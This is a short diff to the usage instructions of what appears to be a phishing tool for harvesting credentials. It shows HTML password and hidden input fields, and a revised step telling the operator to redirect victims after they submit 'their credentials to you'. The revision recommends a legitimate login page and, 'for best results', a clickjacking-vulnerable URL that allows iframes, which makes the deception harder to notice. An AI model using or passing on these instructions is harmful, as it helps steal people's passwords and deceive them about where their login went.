@@ -31,7 +31,7 @@ To Use :
 	
 	`<INPUT NAME="password">`
 	
-3) Add hidden input fields for the name of the project and the URL the users should be redirected to after submitting their credentials to you (Recommend Legitimate Site)
+3) Add hidden input fields for the name of the project and the URL the users should be redirected to after submitting their credentials to you (Recommend Legitimate Login Location - For Best Results Use a Clickjacking Vulnerable URL That Allows iFRAMEs)
 
 	`<INPUT NAME="project" VALUE="My_Project_Here" TYPE="hidden">`
 	
